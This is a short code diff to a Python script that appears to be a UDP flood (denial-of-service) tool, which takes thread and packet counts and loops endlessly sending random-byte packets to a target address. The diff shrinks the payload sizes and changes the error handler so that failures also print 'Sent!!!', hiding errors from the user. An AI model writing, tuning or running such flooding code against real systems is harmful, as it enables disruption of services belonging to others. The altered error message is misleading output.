@@ -10,7 +10,7 @@ choice = str(input(" UDP(y/n):"))
 times = int(input(" Packets per one connection:"))
 threads = int(input(" Threads:"))
 def run():
-	data = random._urandom(20000)
+	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -20,10 +20,10 @@ def run():
 				s.sendto(data,addr)
 			print(i +" Sent!!!")
 		except:
-			print("[!] Error!!!")
+			print("[!] Sent!!!")
 
 def run2():
-	data = random._urandom(65500)
+	data = random._urandom(16)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
